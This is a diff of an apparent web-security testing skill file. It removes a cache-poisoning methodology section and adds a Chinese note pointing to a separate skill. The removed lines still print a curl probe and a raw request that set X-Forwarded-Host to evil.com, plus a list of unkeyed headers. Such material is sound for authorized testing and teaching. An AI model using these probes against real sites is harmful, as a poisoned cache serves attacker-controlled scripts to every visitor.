@@ -89,35 +89,7 @@ https://target.com/account/profile/tracking.gif
 
 ## 3. CACHE POISONING — ATTACK METHODOLOGY
 
-### Unkeyed Input Discovery
-
-Cache keys typically include: `Host`, URL path, query string.
-These are typically NOT in the cache key: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, cookies, custom headers.
-
-```bash
-# Test if X-Forwarded-Host is reflected but not keyed:
-curl -H "X-Forwarded-Host: evil.com" https://target.com/page
-# If response contains evil.com and caches → poisonable
-```
-
-### Common Unkeyed Headers
-
-```text
-X-Forwarded-Host      X-Forwarded-Scheme    X-Forwarded-Proto
-X-Original-URL        X-Rewrite-URL         X-Host
-X-Forwarded-Server    Forwarded             True-Client-IP
-```
-
-### Cache Poisoning via Host Header
-
-```
-GET / HTTP/1.1
-Host: target.com
-X-Forwarded-Host: evil.com
-
-→ Response: <link href="//evil.com/static/main.css">
-→ Cached → all users load attacker's CSS/JS
-```
+> 本节与独立技能 [web-cache-poisoning](../web-cache-poisoning/SKILL.md) 完全重叠，已去重。缓存投毒测试改加载该技能；本文件专注缓存欺骗（Cache Deception）。
 
 ---
 
